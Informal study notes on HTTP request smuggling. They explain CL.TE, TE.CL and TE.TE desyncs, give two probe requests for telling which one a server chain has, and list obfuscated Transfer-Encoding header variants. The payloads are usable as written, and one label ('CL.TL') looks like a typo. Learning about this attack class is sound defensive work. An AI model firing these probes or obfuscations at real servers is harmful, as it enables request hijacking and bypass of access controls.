
CL -> Content-Length
TE -> Transfer-Encoding

each server will use one header, so here is the three types that could do some damge:
- CL.TE 
- TE.CL
- TE.TE

> if first and second use CL, there is no way to do smuggling, i mean i don't know how

first to know which one we dealing with send that: 
```
Content-Length: 6
Transfer-Encoding: chunked

3
abc
X
```

- if **timeout** this means CL.TE cz the frontend send without the X letter and the backend wating 0 
- if **rejected** mybe it is TE.CL or TE.TE
- if **respnse** this means CL.CL which means no flow here 

```
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

- if **socket poison** "XGET not allowed method..."  CL.TL
- if **timeout** this is TE.CL cz the backend server waiting the 6 byte 
- if **response** maybe this is CL.CL or TE.TE 

i don't know a way to bypass CL.CL, but TE.TE There are potentially endless ways to obfuscate the `Transfer-Encoding` header. For example:
```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

